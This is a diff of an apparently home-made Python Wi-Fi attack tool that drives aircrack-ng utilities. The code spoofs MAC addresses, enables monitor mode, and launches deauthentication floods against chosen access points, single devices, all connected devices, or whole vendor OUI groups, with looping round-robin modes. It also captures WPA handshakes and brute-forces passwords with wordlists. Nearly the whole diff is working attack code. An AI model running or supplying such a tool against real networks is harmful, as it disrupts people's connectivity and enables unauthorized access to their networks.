@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-
+import csv
 import os
 import re
 import time
@@ -90,11 +90,11 @@ def run_command_print_output(command):
 
 
 def popen_command(command, killtime=0):
-    print(f'running {command} for {killtime} seconds')
+    print(yellow(f'running {command} for {killtime} seconds'))
     process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
     if killtime:
-        print(yellow(f'if process does not finish in {killtime} seconds, press enter to kill it'))
+        # print(yellow(f'if process does not finish in {killtime} seconds, press enter to kill it'))
         time.sleep(killtime)
         os.killpg(process.pid, signal.SIGTERM)
         process.wait()
@@ -170,13 +170,17 @@ def change_interface():
         elif selection.isnumeric():
             if interface_count >= int(selection) > 0:
                 selected_interface = select_with_number[int(selection) - 1][1]
-                get_mac_of_interface(selected_interface)
+                get_mac_of_interface()
                 break
             elif int(selection) > interface_count:
                 print(f'Selected interface ({selection}) {red("does not exist")}')
 
 
 def check_if_selected_interface_in_monitor_mode():
+    if not selected_interface:
+        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
+            change_interface()
+        return
     interface_settings = run_command(f'iwconfig {selected_interface}')
     if 'monitor' in interface_settings.lower():
         return True
@@ -184,23 +188,31 @@ def check_if_selected_interface_in_monitor_mode():
         return False
 
 
-def switch_interface_to_monitor_mode(interface=selected_interface):
-    print('Setting ' + interface + ' to monitor mode ')
-    run_command(f'ifconfig {interface} down')
-    run_command(f'iwconfig {interface} mode monitor')
-    run_command(f'ifconfig {interface} up')
+def switch_interface_to_monitor_mode():
+    if not selected_interface:
+        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
+            change_interface()
+        return
+    print('Setting ' + selected_interface + ' to monitor mode ')
+    run_command(f'ifconfig {selected_interface} down')
+    run_command(f'iwconfig {selected_interface} mode monitor')
+    run_command(f'ifconfig {selected_interface} up')
 
 
-def switch_interface_to_managed_mode(interface=selected_interface):
-    print('Setting ' + interface + ' to managed mode ')
-    run_command(f'ifconfig {interface} down')
-    run_command(f'iwconfig {interface} mode managed')
-    run_command(f'ifconfig {interface} up')
+def switch_interface_to_managed_mode():
+    if not selected_interface:
+        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
+            change_interface()
+        return
+    print('Setting ' + selected_interface + ' to managed mode ')
+    run_command(f'ifconfig {selected_interface} down')
+    run_command(f'iwconfig {selected_interface} mode managed')
+    run_command(f'ifconfig {selected_interface} up')
 
 
-def get_mac_of_interface(interface=selected_interface):
+def get_mac_of_interface():
     global interface_mac_address
-    output = run_command(f'ip link show {interface}')
+    output = run_command(f'ip link show {selected_interface}')
     mac_address_search = re.search(r'link/\S+ (\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)', output)
     if mac_address_search:
         interface_mac_address = mac_address_search.group(1)
@@ -208,109 +220,26 @@ def get_mac_of_interface(interface=selected_interface):
         print(f'error with {magenta("get_mac_of_interface")}')
 
 
-def spoof_mac_of_interface_with_random_byte(interface=selected_interface):
+def spoof_mac_of_interface_with_random_byte():
+    if not selected_interface:
+        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
+            change_interface()
+        return
     global interface_mac_address
-    print(f'current interface is {interface} and current MAC address is {interface_mac_address}')
-    run_command_print_output(f'ip link set dev {interface} down')
+    print(f'current interface is {selected_interface} and current MAC address is {interface_mac_address}')
+    run_command_print_output(f'ip link set dev {selected_interface} down')
     first_bit = ['2', '3', '4', '5', '6', '7', '8', 'a', 'b', 'c', 'd', 'e', 'f']
     second_bit = ['2', '4', '6', '8', 'c', 'e']
     first_octet = random.choice(first_bit) + random.choice(second_bit)
     random_mac = f'{first_octet}:' + ':'.join(f"{random.randint(0x00, 0xFF):02X}" for _ in range(5))
 
-    print(f'randomly selected mac for {interface} is {random_mac}')
-    run_command_print_output(f'ip link set dev {interface} address {random_mac}')
+    print(f'randomly selected mac for {selected_interface} is {random_mac}')
+    run_command_print_output(f'ip link set dev {selected_interface} address {random_mac}')
     # time.sleep(0.3)
-    run_command(f'ip link set dev {interface} up')
+    run_command(f'ip link set dev {selected_interface} up')
     # time.sleep(0.3)
-    get_mac_of_interface(selected_interface)
+    get_mac_of_interface()
 
-
-def output_ansi_management(output):
-    """
-    This function processes the raw output from airodump to extract only the most recent network information
-    displayed on the terminal.
-
-        Airodump updates the terminal view with new data by using ANSI escape codes, effectively refreshing the
-        screen. Before each refresh, it uses a specific pattern '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' to clear
-        the previous information, and this function uses this pattern to identify and retain only the latest data.
-        Similarly, the end of the standard output is marked by another pattern '\x1b[0K\n\x1b[0J\x1b[?25h',
-        which this function removes.
-
-        Basically
-
-        when I save the output from airodump using subprocess.Popen(..., stdout=subprocess.PIPE) and output =
-        airodump.communicate() the output has all the information from airodump at second = 0 up to seconds = 10
-        where I kill the process
-
-        what we see on screen is an illusion of old text being deleted and new one being
-        written to screen, but it's all done with ansi escape
-
-        you can examine this with print(repr(output)), just printing the output with print(output) would look
-        normal since terminal understands the ansi and hides the information beyond this pattern
-        '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
-
-        everything is fine when printing but this becomes a problem when I want to deal with the output variable like
-        managing the data inside. that's why I only want the latest information visible to us on terminal screen
-
-        '\x1b[0K\n\x1b[0J\x1b[?25h' this is the pattern at the end of the output file from and this
-        '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' is the start pattern for each new airodump refresh
-
-        so if I get the all the data starting from latest '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' up to
-        '\x1b[0K\n\x1b[0J\x1b[?25h' it will return only the latest airodump refresh with no duplicates
-
-        BUT THIS PATTERN ONLY APPLIES TO THE OUTPUT FILE RETRIEVED FROM get_airodump_output()
-
-        and if we are dealing with output file retrieved from get_devices_in_AP_output() (a different output file
-        from get_airodump_output())  the end pattern becomes '\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h' if no devices
-        exist, pattern changes too I made an end+start pattern format for possible scenarios
-
-
-
-        Parameters:
-        - output (str): The raw output from airodump.
-
-        Returns:
-        str: The processed output containing only the latest network information visible on the terminal.
-    """
-
-    if '\x1b[0K\n\x1b[0J\x1b[?25h' in output:
-
-        if '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' in output:
-            start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
-            end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
-            end_index = output.rfind(end_pattern)
-            start_index = output.rfind(start_pattern, 0, end_index)
-            if end_index == -1 or start_index == -1:
-                print('unknown pattern error 1')
-                return
-            else:
-                cleaned_data = output[start_index:end_index]
-                return cleaned_data
-
-    if 'Probes\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h' in output:
-        if '\n\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m' in output:
-            start_pattern = '\n\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m'
-            end_pattern = 'Probes\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h'
-            end_index = output.rfind(end_pattern)
-            start_index = output.rfind(start_pattern, 0, end_index)
-            if end_index == -1 or start_index == -1:
-                print('unknown pattern error 2')
-                return
-            else:
-                return None
-
-    if '\x1b[0K\n\x1b[0J\x1b[?25h' in output:
-        if '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' in output:
-            start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
-            end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
-            end_index = output.rfind(end_pattern)
-            start_index = output.rfind(start_pattern, 0, end_index)
-            if end_index == -1 or start_index == -1:
-                print('unknown pattern error 3')
-                return
-            else:
-                cleaned_data = output[start_index:end_index]
-                return cleaned_data
 
 
 def scan_for_networks():
@@ -337,18 +266,19 @@ def scan_for_networks():
             column = row.split()
             if len(column) >= 12 and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(column[10]) == ']['  and not str(
                     column[10]).startswith('<length:') and not str(column[10]).startswith('0>:'):
-                ssid_counter += 1
-                SSIDS.append([ssid_counter, column[10]])
-                # print(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]}')
-                if column[-3] == 'SAE':
-                    authentication = red(column[-3])
-                elif column[-3] == 'PSK':
-                    authentication = yellow(column[-3])
-                else:
-                    authentication = ''
-                ssids_print_list.append(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]} {authentication}')
-        print('\n==================================================================================================\n')
+                if column[10] not in [ssid[1] for ssid in SSIDS]:
+                    ssid_counter += 1
+                    SSIDS.append([ssid_counter, column[10]])
+                    # print(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]}')
+                    if column[-3] == 'SAE':
+                        authentication = red(column[-3])
+                    elif column[-3] == 'PSK':
+                        authentication = yellow(column[-3])
+                    else:
+                        authentication = ''
+                    ssids_print_list.append(f'{green(SSIDS[ssid_counter - 1][0])}) {SSIDS[ssid_counter - 1][1]} {authentication}')
         while 1:
+            clear()
             for i in ssids_print_list:
                 print(i)
             print('\nif desired SSID is not listed, please return and scan again.')
@@ -375,38 +305,14 @@ def scan_for_networks():
 
 
 def get_bssid_and_station_from_ap():
-    """
-    now we are dealing with data like this
-
-    this is the duplicate data in the output file. actual output variable has much more duplicates then just 3 mentioned here
-
-    see the  output_ansi_management(output) functions documentation to see why that happens
-
-    ['\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '5', '][', 'Elapsed:', '0', 's', '][', '2024-03-02', '11:06', '\x1b[0K']
-    ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']
-    ['\x1b[0K\x1b[1B', 'BSSID', '-31', '4', '0', '0', '3', '360', 'WPA3', 'CCMP', 'SAE', 'ESSID', '\x1b[0K']
-    ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']
-    ['\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '5', '][', 'Elapsed:', '0', 's', '][', '2024-03-02', '11:06', '\x1b[0K']
-    ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']
-    ['\x1b[0K\x1b[1B', 'BSSID', '-31', '4', '0', '0', '3', '360', 'WPA3', 'CCMP', 'SAE', 'ESSID', '\x1b[0K']
-    ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']
-    ['\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '5', '][', 'Elapsed:', '0', 's', '][', '2024-03-02', '11:06', '\x1b[0K']
-    ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']
-    ['\x1b[0K\x1b[1B', 'BSSID', '-31', '4', '0', '0', '3', '360', 'WPA3', 'CCMP', 'SAE', 'ESSID', '\x1b[0K']
-    ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']
-
-    even though we have duplicates
-    i can just say that `find where row[-2] == targetAP` return row[1],row[6] if len(row[1]) == 17`
-    """
-
+  
     def recursion():
         while 1:
             selection = input('Rerun the Scan  Y/N ').lower()
             if selection == 'y':
                 return get_bssid_and_station_from_ap()
             elif selection == 'n':
-                print(
-                    '===============================================================================================\n')
+                clear()
                 print(
                     f'this message is from {green("get_BSSID_and_Station_from_AP")} '
                     f'No {red("BSSID")} and {red("CHANNEL")} will be returned '
@@ -434,10 +340,10 @@ def get_bssid_and_station_from_ap():
                     return row[1], row[6], row[-3]
 
 
-def deauth(interface=selected_interface, interval=0, time_limit=0):
+def deauth(interval=0, time_limit=0):
     if interval:
         aireplay = popen_command_new_terminal(
-            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {interface}')
+            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
         interval_time = interval
         while interval_time > 0:
             print(
@@ -457,7 +363,7 @@ def deauth(interface=selected_interface, interval=0, time_limit=0):
 
     elif time_limit:
         aireplay = popen_command_new_terminal(
-            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {interface}')
+            f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
         time.sleep(time_limit)
         try:
             os.killpg(aireplay.pid, signal.SIGTERM)
@@ -467,13 +373,31 @@ def deauth(interface=selected_interface, interval=0, time_limit=0):
                 f"This error occurs when airodump terminates unexpectedly {red(ProcessLookupError)}")
         return
     else:
-        popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {interface}')
+        popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
 
 
-def deauth_selected_device(interface, target_device, target_ap):
-    aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} {interface}')
-    input(f'Deauthenticating {green(target_device)} in {green(target_ap)} press enter to return')
-    aireplay.kill()
+def deauth_target_device(interval=0):
+    if not target_ap:
+        print(f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target AP")} to continue with this attack')
+        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
+            scan_for_networks()
+        return
+    elif not target_device:
+        print(f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target Device")} to continue with this attack')
+        if input('Select a target Y/N').lower() == 'y':
+            select_target_device()
+        return
+    clear()
+    if not interval:
+        aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} {selected_interface}')
+        print(f'Deauthenticating {green(target_device)} in {green(target_ap)} press enter to return')
+        os.killpg(aireplay.pid, signal.SIGTERM)
+    if interval:
+        aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} {selected_interface}')
+        time.sleep(interval)
+        os.killpg(aireplay.pid, signal.SIGTERM)
+
+
 
 def get_airodump_output():
     def recursion():
@@ -482,8 +406,7 @@ def get_airodump_output():
             if selection == 'y':
                 return get_airodump_output()
             elif selection == 'n':
-                print(
-                    '===============================================================================================\n')
+                clear()
                 print(
                     f'this message is from {green("get_airodump_output")} '
                     f'No {red("Output")} will be returned '
@@ -496,23 +419,35 @@ def get_airodump_output():
     else:
         return output
 
+def oui_formatter():
+    clear()
+    popen_command(f'airodump-ng -w temp_output --output-format csv {selected_interface}', killtime=10)
+    with open('temp_output-01.csv', 'r') as f:
+        reader = csv.reader(f)
+        data = [(row[0], row[-2]) for row in reader if len(row) >= 13 and ':' in row[0]]
+    # Sort data by OUI
+    data.sort(key=lambda x: x[0][:8])
+
+    # Group and print SSIDs by OUI
+    current_oui = ''
+    for mac, ssid in data:
+        oui = mac[:8]
+        if oui != current_oui:
+            current_oui = oui
+            print(f"\nOUI   :   {yellow(oui)}")
+        print(f"  - {blue(ssid)} ({yellow(mac)})")
+    remove_files_with_prefix(os.getcwd(), 'temp_output')
+    # os.remove('temp_output-01.csv')
 
 
 def get_airodump_output_oui_formatted():
-    """
-    th
-
-    param interface
-    """
-
     def recursion():
         while 1:
             selection = input('Rerun the Scan  Y/N ').lower()
             if selection == 'y':
                 return get_airodump_output_oui_formatted()
             elif selection == 'n':
-                print(
-                    '===============================================================================================\n')
+                clear()
                 print(
                     f'this message is from {green("get_airodump_output_OUI_formatted")} '
                     f'No {red("OUI_output")} will be returned '
@@ -548,7 +483,7 @@ def get_airodump_output_oui_formatted():
         return oui_output
 
 
-def scan_for_networks_by_oui_select_router(interface):
+def scan_for_networks_by_oui_select_router():
     oui_output = get_airodump_output_oui_formatted()
     print(oui_output)
     print('==================================================================================================\n')
@@ -567,19 +502,16 @@ def scan_for_networks_by_oui_select_router(interface):
             print(f'Type {green("999")} to cancel OUI selection')
 
 
-def remove_ansi_escape_codes(input_text):
-    ansi_escape = re.compile(r'\x1b\[[0-9;]*m')
-    return ansi_escape.sub('', input_text)
 
 
-def get_ssid_from_oui(output, target_oui):
+def get_ssid_from_oui(output):
     ssids = []
     lines = output.split('\n')
     current_oui = None
     for line in lines:
         if line.startswith("OUI:"):
             current_oui = line.split()[1]
-        elif current_oui == target_oui and "{" in line:
+        elif current_oui == target_router_oui and "{" in line:
             ssid_start_index = line.find("{") + 1
             ssid_end_index = line.find("}", ssid_start_index)
             ssid = line[ssid_start_index:ssid_end_index].strip()
@@ -588,25 +520,33 @@ def get_ssid_from_oui(output, target_oui):
     return [ssid for ssid in ssids if ssid]
 
 
-def deauth_by_oui(interface, target_oui):
-    oui_output = get_airodump_output_oui_formatted(interface)
-    oui_output = remove_ansi_escape_codes(oui_output)
-    SSIDs_in_oui_output = get_ssid_from_oui(oui_output, target_oui)
+def deauth_by_oui():
+    def remove_ansi_escape_codes(input_text):
+        ansi_escape = re.compile(r'\x1b\[[0-9;]*m')
+        return ansi_escape.sub('', input_text)
+    global target_ap
+    STORE_target_ap = target_ap
+    oui_output = get_airodump_output_oui_formatted()
+    # oui_output = remove_ansi_escape_codes(oui_output)
+    SSIDs_in_oui_output = get_ssid_from_oui(oui_output)
     if SSIDs_in_oui_output:
-        print(f"List of SSIDs in {target_oui}")
+        clear()
+        print(f"List of SSIDs in {target_router_oui}")
         for SSID in SSIDs_in_oui_output:
             print(f"{green(SSID)}")
-        print("=====================================",
-              " 1   : Deauth all SSIDs once and quit",
-              " 2   : Deauth all SSIDs roundrobin",
-              " 999 : Quit")
+        print(f"{blue('---------------------------------------')}\n",
+              "1   : Deauth all devices once and quit\n",
+              "2   : Deauth all devices roundrobin\n",
+              "999 : Quit\n")
         while 1:
             selection = input("Choose an option : ")
             if selection == '999':
                 return
             elif selection == '1':
                 for SSID in SSIDs_in_oui_output:
-                    deauth(interface, SSID, interval=True)
+                    target_ap = SSID
+                    deauth(interval=60)
+                target_ap = STORE_target_ap
                 return
             elif selection == '2':
                 rr_counter = 0
@@ -614,22 +554,28 @@ def deauth_by_oui(interface, target_oui):
                     for SSID in SSIDs_in_oui_output:
                         clear()
                         print(f"Deauthing {SSID}")
-                        deauth(interface, SSID, interval=True)
+                        deauth(interval=60)
                     rr_counter += 1
                     print(
-                        f"each SSID in {green(target_oui)} has been Deauthenticated for {green(rr_counter)} times")
+                        f"each SSID in {green(target_router_oui)} has been Deauthenticated for {green(rr_counter)} times")
                     print(
                         f"moving to round {green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")
-                    if keyboard.is_pressed('q'):
+                    if check_for_q_press():
                         print("Loop canceled by user.")
+                        target_ap = STORE_target_ap
                         return
-                    time.sleep(3)
     else:
-        print(f"No SSID found in f{target_oui}")
+        print(f"No SSID found in f{target_router_oui}")
     return
 
 def select_target_device():
+    if not target_ap:
+        print(f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target AP")} to continue with this attack')
+        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
+            scan_for_networks()
+        return
     global target_device
+    clear()
     output, error = popen_command(f'airodump-ng -N {target_ap} -c {target_channel} {selected_interface}', killtime=5)
     devices = []
     for row in output.split('\n'):
@@ -637,9 +583,9 @@ def select_target_device():
         # print(repr(column))
         if len(column) >= 7 and str(column[0] == target_bssid) and len(column[1]) == 17:
             device = column[1]
-            if device not in devices:
+            if device not in devices and device != target_bssid:
                 devices.append(device)
-    devices_print  = []
+    devices_print = []
     counter = 0
     if devices:
         clear()
@@ -659,117 +605,82 @@ def select_target_device():
     else:
         input(f'No Device is connected to {green(target_bssid)} press enter to return')
         return
+
+def check_for_q_press(interval=0.1, timeout=3):
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        if keyboard.is_pressed('q'):
+            return True
+        time.sleep(interval)
+    return False
 def deauth_devices_in_target_ap():
-    output = popen_command('delete')
-    # output = get_devices_in_ap_output()
-    print(output)
-    output = output_ansi_management(output)
-    if output is None:
-        print(
-            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful '
-            f'However it appears there are no devices connected to {green(target_ap)}')
-        print(
-            f'If you {red("dont")} see Airodump output '
-            f'then there is a problem with {red("output_ansi_management")}')
-        print(
-            f'If that`s the case then uncomment the print(repr(output)) 3 lines above this message in the source code '
-            f'and check the ansi escape output and check '
-            f'if start/end pattern exist in {red("output_ansi_management")}')
-        print(f'and contact me on {green("github")}')
-        input(f'input anything to return to previous function \n')
+
+    global target_device
+    clear()
+    if not target_ap:
+        print(f'To {red("Deauthenticate")} a {yellow("target Device")} first select a {yellow("target AP")} to continue with this attack')
+        if input(f'Select {yellow("target AP")} Y/N : ').lower() == 'y':
+            scan_for_networks()
         return
+    Save_target_device = target_device
+    output, error = popen_command(f'airodump-ng -N {target_ap} -c {target_channel} {selected_interface}', killtime=10)
 
     if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
         devices = []
-
         for column in output.split('\n'):
             row = column.split()
-            ''' AT THIS POINT the Data is formatted like this 
-               ['\x1b[0K']                                                                                                                                                                                                                                 
-               ['\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '3', '][', 'Elapsed:', '6', 's', '][', '2024-02-29', '19:08', '\x1b[0K']                                                                                                                         
-               ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'RXQ', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']                                                                                                                  
-               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', '-28', '100', '55', '3', '0', '3', '360', 'WPA2', 'CCMP', 'PSK', '{targetAP}', '\x1b[0K']                                                                                               
-               ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']                                                                                                                                           
-               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(1) in target AP}', 'X', 'X', 'X', 'X','X']  
-               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(2) in target AP}', 'X', 'X', 'X', 'X']  
-               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(3) in target AP}', 'X', 'X', 'X', 'X','X','X'] maximum of 9 elements in a given row
-
-               mac address is 17 chars long and in 2nd index of the row  
-
-            '''
             if len(row) >= 3 and len(row[2]) == 17:
-                devices.append(row[2])
-
+                if row[2] not in devices:
+                    devices.append(row[2])
         if devices:
+            clear()
             print(
-                f'{green(str(len(devices)))} DEVICE MAC ADDRESS(ES) found on {green(target_ap)}')
+                f'{green(str(len(devices)))} DEVICE MAC ADDRESS(ES) found on {green(target_ap)}\n')
             for device in devices:
-                print(green(device))
-            print("=====================================",
-                  " 1   : Deauth all devices once and quit",
-                  " 2   : Deauth all devices roundrobin",
-                  " 999 : Quit")
+                print(yellow(device))
+
+            print(f"{blue('---------------------------------------')}\n",
+                  "1   : Deauth all devices once and quit\n",
+                  "2   : Deauth all devices roundrobin\n",
+                  "999 : Quit\n")
             while 1:
                 selection = input("Choose an option : ")
                 if selection == '999':
                     return
                 elif selection == '1':
                     for device in devices:
-                        deauth_selected_device(interface, device, target_ap)
+                        clear()
+                        print(f"Deauthing {device} for 60 seconds")
+                        target_device = device
+                        deauth_target_device(interval=60)
+                    target_device = Save_target_device
                     return
                 elif selection == '2':
                     rr_counter = 0
                     while 1:
                         for device in devices:
                             clear()
-                            print(f"Deauthing {device}")
-                            deauth_selected_device(interface, device, target_ap)
+                            print(f"Deauthing {device} for 60 seconds")
+                            target_device = device
+                            deauth_target_device(interval=60)
                         rr_counter += 1
                         print(
-                            f"each SSID in {green(device)} has been Deauthenticated for {green(rr_counter)} times")
+                            f"each SSID in {green(target_ap)} has been Deauthenticated for {green(rr_counter)} times")
                         print(
                             f"moving to round {green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")
-                        if keyboard.is_pressed('q'):
+
+                        if check_for_q_press():
                             print("Loop canceled by user.")
+                            target_device = Save_target_device
                             return
-                        time.sleep(3)
+        else:
+            input(f"No Device is connected to {green(target_bssid)} press enter to return")
     else:
         print('==================================================================================================\n')
         print(f'This message is from {green("deauth_devices_in_targetAP_with_interval")}')
         print(f'There is a problem with {red("get_devices_in_AP_output")}')
         input(f'input anything to return to previous function \n')
         return
-
-
-def get_ssi_ds_with_psk_authentication_from_output(output):
-    """
-    can only be used with the output variable returned from get_airodump_output()
-    :param output: variable returned from get_airodump_output()
-    :return: list of SSIDs where authentication is 'PSK'
-    """
-    output = output_ansi_management(output)
-    if output is None:
-        print(f'there is a problem with f{red("output_ansi_management(output)")}')
-        print(
-            f'probably a new update to {green("aircrack-ng package")} '
-            f'was made that changed the ansi pattern on stdout'
-            f'or the pattern is not recognized in output_ansi_management(output)')
-        print(f'Create a issue on {green("github")}.')
-        input(f'input anything to return : ')
-        return
-    authentications = []
-    for column in output.split('\n'):
-        row = column.split()
-        ''' AT THIS POINT the Data is formatted like this                                                                                                                
-         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
-         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
-         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
-         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
-
-        '''
-        if len(row) >= 12 and row[-3] == ('PSK' or 'psk'):
-            authentications.append(row[-2])
-    return authentications
 
 
 def remove_files_with_prefix(directory, prefix):
@@ -789,6 +700,7 @@ def remove_files_with_prefix(directory, prefix):
 
 
 def capture_handshake():
+
     def recursion():
         selection = input('\n Do you want to try again Y/N : ').lower()
         while 1:
@@ -798,14 +710,18 @@ def capture_handshake():
                 return
         return
 
+    if not target_ap:
+        print('Select a target AP to continue with this attack')
+        if input('Select a target Y/N').lower() == 'y':
+            scan_for_networks()
+        return
     if target_ap_authentication == 'PSK':
         input(target_ap_authentication)
         clear()
         print(f'Running packet capture on {green(target_ap)}')
         print(
             f'Switching channel on  {green(selected_interface)} to {green(target_channel)}')
-        switch_channel = subprocess.Popen(f'iwconfig {selected_interface} channel {target_channel}', shell=True)
-        switch_channel.wait()
+        switch_interface_channel()
 
         target_directory = f'/tmp/{target_ap}-handshakeCapture'
         os.makedirs(target_directory, exist_ok=True)
@@ -866,15 +782,12 @@ def capture_handshake():
         input(f"Press enter to return and select a AP that uses all use {yellow('PSK')} Authentication")
         return
 
-def bruteforce_handshake_capture(interface, target_ap):
-    """
-
-    :param interface:
-    :paramtarget_ap:
-    :return:
-    """
-    BSSID, STATION = get_bssid_and_station_from_ap(interface, target_ap)
-
+def bruteforce_handshake_capture():
+    if not target_ap:
+        print('Select a target AP to continue with this attack')
+        if input('Select a target Y/N').lower() == 'y':
+            scan_for_networks()
+        return
     search_pattern = f'/tmp/{target_ap}-handshakeCapture/{target_ap}*.cap'
     matches = glob.glob(search_pattern)
     if matches:
@@ -913,7 +826,7 @@ def bruteforce_handshake_capture(interface, target_ap):
             if capture_file_address == '999':
                 return
             print(f"selected capture file address is : {green(capture_file_address)} ")
-            selection = input("Type Y to continue Y : ").lower()
+            selection = input("Type Y to continue Y/N : ").lower()
             if selection == 'y':
                 break
     if capture_file_address == '999':
@@ -961,10 +874,10 @@ def bruteforce_handshake_capture(interface, target_ap):
 
         target_directory = f'/tmp/{target_ap}-password'
         os.makedirs(target_directory, exist_ok=True)
-        aircrack_script = f'aircrack-ng -w {selected_password_list} -b {BSSID} -l {target_directory}/{target_ap}.txt {capture_file_address}'
+        aircrack_script = f'aircrack-ng -w {selected_password_list} -b {target_bssid} -l {target_directory}/{target_ap}.txt {capture_file_address}'
         for terminal in terminals:
             subprocess.Popen(f'{terminal} -e {aircrack_script}', shell=True, preexec_fn=os.setsid, )
-            print(f'aircrack-ng -w {selected_password_list} -b {BSSID} {capture_file_address}')
+            print(f'aircrack-ng -w {selected_password_list} -b {target_bssid} {capture_file_address}')
             print('\n')
             print(
                 f'Process Complete. To check if password is found '
@@ -973,38 +886,21 @@ def bruteforce_handshake_capture(interface, target_ap):
             return
 
 
-def capture_packets(interface, target_ap):
-    output = get_airodump_output(interface)
-    if output is None:
-        print(
-            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful However it '
-            f'appears there are no devices connected to {green(target_ap)}')
-        print(
-            f'If you {red("dont")} see Airodump output '
-            f'then there is a problem with {red("get_airodump_output")}')
-        input(f'input anything to return to previous function \n')
-        return
+def switch_interface_channel():
+    run_command(f'iwconfig {selected_interface} channel {target_channel}')
 
-    elif output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
-        BSSID, CHANNEL = get_bssid_and_station_from_ap(interface, target_ap)
+def capture_packets():
+    output, error = popen_command(f'airodump-ng {selected_interface}', killtime=10)
+    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
         print(f'Running packet capture on {green(target_ap)}')
